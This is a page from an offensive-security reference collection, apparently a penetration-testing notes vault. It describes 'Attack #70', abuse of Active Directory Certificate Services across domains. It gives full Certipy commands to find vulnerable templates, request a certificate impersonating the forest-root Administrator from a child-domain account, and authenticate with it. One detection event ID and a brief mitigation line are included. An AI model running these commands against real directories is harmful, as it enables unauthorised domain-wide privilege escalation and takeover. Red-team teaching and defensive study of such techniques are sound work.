---
title: "Attack #70 — ADCS Cross-Domain Enrollment"
description: "When ADCS is deployed in a multi-domain forest, certificate enrollment often uses Enterprise CAs that serve the entire forest. A user from a child domain…"
category: active-directory
subcategory: "Trust Abuse"
tags: ["active-directory", "adcs", "hashing"]
tools: ["Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Nine/🔶 Attack #70 — ADCS Cross-Domain Enrollment.md"
---
# 🔶 Attack #70 — ADCS Cross-Domain Enrollment

***

## 📖 How It Works

When ADCS is deployed in a multi-domain forest, certificate enrollment often uses **Enterprise CAs** that serve the entire forest. A user from a child domain can enroll for certificates from the forest root's CA — and if a vulnerable template exists (ESC1-ESC8), they can request a certificate for any user in the forest, including Enterprise Admins in the root domain. This provides a **cross-domain escalation path** without needing the child domain's KRBTGT hash.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Enterprise CA serving multiple domains** | Standard in most multi-domain forests |
| **Vulnerable cert template** | ESC1/ESC2/ESC4 etc. accessible from child domain |
| **Child domain user credentials** | Any authenticated user |

***

## 💻 Full Commands

```bash
# ── Enumerate cross-domain CAs ────────────────────────────────────────────────
certipy find -u user@child.corp.local -p 'Password1' -dc-ip 10.10.10.20 \
  -vulnerable -stdout
# Look for: CAs from parent domain with vulnerable templates

# ── Exploit ESC1 cross-domain ─────────────────────────────────────────────────
certipy req -u user@child.corp.local -p 'Password1' -ca ROOT-CA \
  -template VulnTemplate -upn Administrator@corp.local \
  -dc-ip 10.10.10.10 -target ROOT-CA.corp.local

# ── Authenticate as forest root Administrator ─────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Enrollment from child domain user targeting parent domain identity |

***

## 🔗 Attack Chain Context

```
[ADCS Cross-Domain] ──→ Enroll for forest root cert from child domain
         │
         ├──→ 🔗 No KRBTGT needed — pure ADCS escalation path
         ├──→ 🔗 Combines with ESC1-ESC8 from Category 4
         └──→ 💀 Defeated by: harden ADCS templates, restrict enrollment across domains
```

***

> ✅ **Attack #70 — ADCS Cross-Domain Enrollment complete.**
